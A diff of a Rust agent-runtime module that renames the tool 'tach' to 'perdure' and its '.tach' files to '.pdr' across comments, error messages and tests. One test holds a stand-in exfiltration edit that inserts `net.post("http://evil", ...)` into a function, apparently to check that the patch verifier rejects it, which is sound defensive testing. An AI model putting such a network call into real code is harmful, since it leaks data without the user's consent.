@@ -3,7 +3,7 @@
 //! This is the layer that turns the deterministic repair loop into something a
 //! long-horizon agent can lean on: a run that is *budgeted*, *authority-scoped*,
 //! *checkpointed*, *resumable*, and *replayable*. It reuses the exact same repair
-//! leaves as `tach fix` — collect the diagnostics, pick the next one, build its
+//! leaves as `perdure fix` — collect the diagnostics, pick the next one, build its
 //! typed patch, verify it through the pipeline — but wraps each step in an event,
 //! a checkpoint, and a policy gate derived from the goal's `allow` block.
 //!
@@ -34,7 +34,7 @@ pub struct RunResult {
     /// run is resumable.
     pub crashed: bool,
     /// True when an action run stopped at an approval gate. Not a crash and not a
-    /// terminal status — the run is healthy and waiting for `tach goal approve`.
+    /// terminal status — the run is healthy and waiting for `perdure goal approve`.
     pub paused: bool,
 }
 
@@ -212,7 +212,7 @@ pub fn resume_run(repo: &Path, run_id: &str, crash_after: Option<u64>) -> io::Re
     if record.kind == "coding" {
         return Err(io::Error::new(
             io::ErrorKind::InvalidInput,
-            "a coding run continues via `tach guard verify`, not `tach goal resume`",
+            "a coding run continues via `perdure guard verify`, not `perdure goal resume`",
         ));
     }
     if record.kind == "action" {
@@ -1808,7 +1808,7 @@ mod tests {
             static N: AtomicU64 = AtomicU64::new(0);
             let n = N.fetch_add(1, Ordering::Relaxed);
             let dir =
-                std::env::temp_dir().join(format!("tach_rt_{}_{}_{}", std::process::id(), tag, n));
+                std::env::temp_dir().join(format!("perdure_rt_{}_{}_{}", std::process::id(), tag, n));
             let _ = std::fs::remove_dir_all(&dir);
             std::fs::create_dir_all(&dir).unwrap();
             TempRepo(dir)
@@ -1826,7 +1826,7 @@ mod tests {
 
     /// The demo's broken auth project plus its goal, as a base workspace + spec.
     fn demo() -> (GoalSpec, Workspace) {
-        let (prog, diags) = Program::parse_sources(vec![SourceFile::new("goal.tach", DEMO_GOAL)]);
+        let (prog, diags) = Program::parse_sources(vec![SourceFile::new("goal.pdr", DEMO_GOAL)]);
         assert!(
             diags.iter().all(|d| !d.is_error()),
             "goal must parse: {:?}",
@@ -1835,8 +1835,8 @@ mod tests {
         let decl = goal::find_goal(&prog, "FixFailingTests").expect("demo goal");
         let spec = GoalSpec::from_decl(decl);
         let mut ws = Workspace::new();
-        ws.insert("src/auth.tach", DEMO_AUTH);
-        ws.insert("tests/auth_test.tach", DEMO_TEST);
+        ws.insert("src/auth.pdr", DEMO_AUTH);
+        ws.insert("tests/auth_test.pdr", DEMO_TEST);
         (spec, ws)
     }
 
@@ -2008,9 +2008,9 @@ mod tests {
         // We model the danger directly through the pipeline the runtime uses.
         use crate::patch::{verify_patch, Edit, Patch, VerifyOpts};
         let mut ws = Workspace::new();
-        ws.insert("src/m.tach", "fn pure(x: Int) -> Int {\n  return x\n}\n");
+        ws.insert("src/m.pdr", "fn pure(x: Int) -> Int {\n  return x\n}\n");
         ws.insert(
-            "tests/m_test.tach",
+            "tests/m_test.pdr",
             "test \"id\" {\n  ensure pure(2) == 2\n}\n",
         );
         let at = "fn pure(x: Int) -> Int {\n  ".len();
@@ -2019,7 +2019,7 @@ mod tests {
             reason: "exfiltrate".into(),
             touches: vec!["src/**".into()],
             edits: vec![Edit {
-                file: "src/m.tach".into(),
+                file: "src/m.pdr".into(),
                 span: crate::span::Span::at(at),
                 replacement: "net.post(\"http://evil\", \"x\")\n  ".into(),
             }],
@@ -2050,7 +2050,7 @@ mod tests {
         action::builtin_action_goal("ResolveDuplicateCharge").expect("catalog entry")
     }
 
-    /// Mirror what `tach goal approve` does: flip the approval file to a terminal
+    /// Mirror what `perdure goal approve` does: flip the approval file to a terminal
     /// status and append the decision event (the human decision is recorded once,
     /// here, never re-emitted by the driver).
     fn decide(repo: &Path, run_id: &str, action_id: &str, status: &str, kind_const: &str) {
@@ -2454,7 +2454,7 @@ mod tests {
     }
 
     #[test]
-    fn action_run_writes_only_under_dot_tach() {
+    fn action_run_writes_only_under_dot_perdure() {
         let repo = TempRepo::new("act_nofiles");
         let (spec, plan) = resolve_dup();
         start_action_run(repo.path(), spec, plan, None).unwrap();
@@ -2465,7 +2465,7 @@ mod tests {
             .collect();
         assert_eq!(
             entries,
-            vec![".tach".to_string()],
+            vec![".perdure".to_string()],
             "an action goal writes nothing into the working tree"
         );
     }
@@ -2525,7 +2525,7 @@ mod tests {
 
     /// Parse a one-off plan goal from source (for authority/budget/nesting edges).
     fn parse_plan_goal(src: &str, name: &str) -> (GoalSpec, PlanBlock) {
-        let (prog, diags) = Program::parse_sources(vec![SourceFile::new("t.tach", src)]);
+        let (prog, diags) = Program::parse_sources(vec![SourceFile::new("t.pdr", src)]);
         assert!(
             diags.iter().all(|d| !d.is_error()),
             "plan source parse errors: {diags:?}"
@@ -2541,7 +2541,7 @@ mod tests {
             .count()
     }
 
-    /// Grant the run's single currently-pending gate (mirrors `tach goal approve`)
+    /// Grant the run's single currently-pending gate (mirrors `perdure goal approve`)
     /// and return its gate id.
     fn approve_pending(repo: &Path, run_id: &str) -> String {
         let pending = store::list_approvals(repo, run_id)
@@ -2875,7 +2875,7 @@ mod tests {
     }
 
     #[test]
-    fn plan_run_writes_only_under_dot_tach() {
+    fn plan_run_writes_only_under_dot_perdure() {
         let repo = TempRepo::new("plan_iso");
         let (spec, plan) = reconcile();
         start_plan_run(repo.path(), spec, plan, BTreeMap::new(), None).unwrap();
@@ -2883,7 +2883,7 @@ mod tests {
             .unwrap()
             .map(|e| e.unwrap().file_name().to_string_lossy().into_owned())
             .collect();
-        assert_eq!(entries, vec![".tach".to_string()], "no stray files at root");
+        assert_eq!(entries, vec![".perdure".to_string()], "no stray files at root");
     }
 
     // ----- user-authored (workspace) plan goals -----
@@ -2929,7 +2929,7 @@ mod tests {
 
     fn workspace_base(src: &str) -> BTreeMap<String, String> {
         let mut base = BTreeMap::new();
-        base.insert("goal.tach".to_string(), src.to_string());
+        base.insert("goal.pdr".to_string(), src.to_string());
         base
     }
 
@@ -2982,7 +2982,7 @@ mod tests {
         let rec = store::load_goal(repo.path(), &id).unwrap();
         assert_eq!(rec.kind, "plan");
         assert_eq!(
-            rec.base_files.get("goal.tach").map(String::as_str),
+            rec.base_files.get("goal.pdr").map(String::as_str),
             Some(WORKSPACE_PLAN_SRC),
             "the goal source is frozen into the run record"
         );
